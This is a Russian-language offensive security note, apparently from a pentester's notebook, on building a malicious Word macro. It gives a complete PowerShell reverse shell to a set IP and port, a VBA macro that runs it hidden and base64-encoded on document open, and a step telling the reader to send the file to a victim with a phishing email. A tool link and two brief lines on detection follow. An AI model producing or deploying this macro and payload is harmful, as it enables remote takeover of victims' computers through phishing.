#exploit #word #attacks 

> Макросы содержат программный код, написанный на скриптовом языке, который может выполнять команды, полезные для атакующего

# Создание макроса в Word

1) Сохранить в .doc
2) ВИД -> МАКРОСЫ
3) Задать название и выбрать наш созданный файл
4) В окно VBA Вставить необходимый код:

  Вставляем код для реверс шелла:
```vb
// Измените IP-адрес и порт   
$client = New-Object System.Net.Sockets.TCPClient("192.168.253.129",7171);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};  
while(($i = $stream.Read($bytes,  0  , $bytes.Length)) -ne  0  ){;
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data  2  >&  1|Out-String);
$sendback2 = $sendback+"PS"+(pwd).Path+ "> " ;$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

5) Затем закодируем полезную нагрузку с помощью base64 UTF-16LE, чтобы избежать проблем со специальными символами
6) Затем мы разбиваем строку в кодировке base64 на более мелкие фрагменты по 50 символов и объединяем их в _переменную Str_

```vb
Sub AutoOpen()  
  MyMacro  
End Sub  
Sub Document_Open()  
  MyMacro  
End Sub  
Sub MyMacro()  
  Dim Str As String  
   
  Str = Str + "powershell.exe -nop -w hidden -e JABjAGwAaQBlAG4Ad"  
  Str = Str + "AAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdAB"  
  Str = Str + "lAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDA"  
  Str = Str + "GwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADIANQAzAC4"  
  Str = Str + "AMQAyADkAIgAsADcAMQA3ADEAKQA7ACQAcwB0AHIAZQBhAG0AI"  
  Str = Str + "AA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQB"  
  Str = Str + "tACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgA"  
  Str = Str + "D0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGk"  
  Str = Str + "AbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZ"  
  Str = Str + "QBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdAB"  
  Str = Str + "lAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7A"  
  Str = Str + "DsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGM"  
  Str = Str + "AdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0AL"  
  Str = Str + "gBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwA"  
  Str = Str + "pAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsA"  
  Str = Str + "DAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACA"  
  Str = Str + "AKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAAT"  
  Str = Str + "wB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgB"  
  Str = Str + "hAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgA"  
  Str = Str + "CIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACA"  
  Str = Str + "AKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AI"  
  Str = Str + "AAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgB"  
  Str = Str + "BAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlA"  
  Str = Str + "G4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHI"  
  Str = Str + "AaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZ"  
  Str = Str + "QBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAB"  
  Str = Str + "yAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlA"  
  Str = Str + "G4AdAAuAEMAbABvAHMAZQAoACkA"  
  
  CreateObject("Wscript.Shell").Run Str  
End Sub
```

7) Используем этот документ для передачи жертве вместе с фишинговым письмом


# Инструмент
Macro reverse shell
[glowbase](https://github.com/glowbase/macro_reverse_shell)
```shell
python3 generate.py <LHOST> <LPORT>
```

## Защита 

1) Использовать EDR для обнаружения
2) Использовать инструмент [olevba](https://github.com/decalage2/oletools) для анализа *.doc* файлов 